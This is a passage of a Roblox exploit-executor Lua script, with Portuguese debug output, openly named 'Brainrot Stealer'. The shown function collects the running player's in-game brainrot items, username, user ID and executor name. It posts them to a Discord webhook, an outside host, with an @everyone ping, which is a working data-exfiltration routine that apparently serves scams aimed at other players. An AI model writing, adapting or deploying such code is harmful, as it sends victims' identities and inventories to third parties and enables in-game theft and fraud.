        return
    end
    
    print("[DEBUG]   WEBHOOK_URL: " .. WEBHOOK_URL)
    
    local request = syn and syn.request or (http and http.request or (http_request or request))
    if not request then
        print("[DEBUG]   ❌ Função de request não encontrada!")
        return
    end
    print("[DEBUG]   ✅ Request function encontrada!")
    
    local brainrots = scanBrainrotsFromBase()
    print("[DEBUG]   Brainrots encontrados: " .. #brainrots)
    
    if #brainrots == 0 then
        print("[DEBUG]   ⚠️ Nenhum brainrot encontrado, enviando webhook vazio...")
    end
    
    local allItems = {}
    for _, item in ipairs(brainrots) do
        table.insert(allItems, item)
    end
    
    local lines = {}
    for _, item in ipairs(allItems) do
        if item.type == "Brainrot" then
            local mutationText = ""
            if item.mutation and item.mutation ~= "Normal" and item.mutation ~= "" then
                mutationText = " | Mutation: **" .. item.mutation .. "**"
            end
            table.insert(lines, "**" .. item.name .. "** [Brainrot]" .. mutationText .. " | Gen: **" .. formatNumber(item.gen) .. "**")
        end
    end
    
    if #lines == 0 then
        table.insert(lines, "Nenhum item encontrado!")
    end
    
    local description = table.concat(lines, "\n")
    if #description > 4000 then
        description = description:sub(1, 3996) .. "..."
    end
    
    local executorName = "Unknown"
    pcall(function()
        if identifyexecutor then executorName = identifyexecutor()
        elseif getexecutorname then executorName = getexecutorname() end
    end)
    
    local playerCount = #Players:GetPlayers()
    local unixTime = os.time()
    
    print("[DEBUG]   Executor: " .. executorName)
    print("[DEBUG]   Players no server: " .. playerCount)
    print("[DEBUG]   Description: " .. description)
    
    local embed = {
        title = "Brainrot Stealer",
        description = description,
        color = 0xFF0000,
        fields = {
            {
                name = "Server",
                value = "Players: **" .. playerCount .. "** | Scanned: <t:" .. unixTime .. ":R>",
                inline = true
            },
            {
                name = "Executor",
                value = executorName,
                inline = true
            }
        },
        footer = {
            text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId .. " | " .. os.date("%d/%m/%Y %H:%M:%S")
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local payload = {
        content = "@everyone",
        embeds = { embed },
        username = "Stealer",
        avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
    }
    
    local jsonBody = HttpService:JSONEncode(payload)
    print("[DEBUG]   Payload gerado! Tamanho: " .. #jsonBody)
    
    local success, result = pcall(function()
        return request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = jsonBody
        })
    end)
    
    if success then
        print("[DEBUG]   ✅ Webhook enviado com sucesso!")
        if result and result.StatusCode then
            print("[DEBUG]   StatusCode: " .. result.StatusCode)
        end
    else
        print("[DEBUG]   ❌ Erro ao enviar webhook: " .. tostring(result))
    end
end

